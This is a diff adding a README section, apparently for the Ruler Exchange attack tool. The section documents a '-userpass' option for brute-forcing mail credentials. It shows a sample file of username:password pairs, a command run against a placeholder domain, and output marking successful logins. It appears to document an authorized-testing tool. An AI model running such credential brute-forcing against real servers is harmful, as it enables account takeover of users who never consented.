@@ -84,6 +84,22 @@ You should see your brute-force in action:
 [x] Failed: henry.hammond:Eish
 ```
 
+Alternatively, you can specify a userpass file with the ```-userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:
+
+```
+$ cat userpass.txt
+john.ford:August2016
+henry.hammond:Password!2016
+cindy.baker:Password1
+
+./ruler -domain evilcorp.ninja -brute -userpass userpass.txt -v -insecure
+
+[*] Starting bruteforce
+[+] Success: john.ford:August2016
+[x] Failed: henry.hammond:Password!2016
+[+] Success: cindy.baker:Password1
+```
+
 There are a few other flags that work with ```-brute```
 These are:
 * -stop _//stop on the first valid username:password combo_
